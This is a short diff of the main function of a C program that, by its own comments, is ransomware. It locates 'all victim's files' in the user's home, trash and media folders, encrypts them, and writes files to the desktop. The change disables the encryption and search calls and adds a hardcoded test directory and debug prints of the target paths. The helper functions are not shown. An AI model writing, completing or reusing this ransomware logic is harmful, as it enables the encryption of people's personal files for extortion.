@@ -21,18 +21,25 @@ int main(){
     char * username = get_username();
     char * trash = get_trash_path(home);
     char * media = get_media_path(username);
-    char * test_path = get_test_path(desktop);
+    // char * test_path = get_test_path(desktop);
+
+    char * test_path = "/home/tarcisio/teste/";
 
     /* finding all victim's files */
-    //find_files(&files, test_path);
-    find_files(&files, home);
-    find_files(&files, trash);
-    find_files(&files, media);
-    
+    // find_files(&files, test_path);
+    // find_files(&files, home);
+    // find_files(&files, trash);
+    // find_files(&files, media);
+    // print(files);
+    printf("%s\n", desktop);
+    printf("%s\n", home);
+    printf("%s\n", username);
+    printf("%s\n", trash);
+    printf("%s\n", media);
     
     /* start encryption */
-    encrypt_files(files, &encrypted, &not_encrypted);
-    create_files_desktop(encrypted, files, desktop);
+    // encrypt_files(files, &encrypted, &not_encrypted);
+    // create_files_desktop(encrypted, files, desktop);
     
     /* Free the linked lists*/
     destroy(&files);
@@ -45,7 +52,7 @@ int main(){
     free(username);
     free(trash);
     free(media);
-    free(test_path);
+    // free(test_path);
 
     return 0;
 }
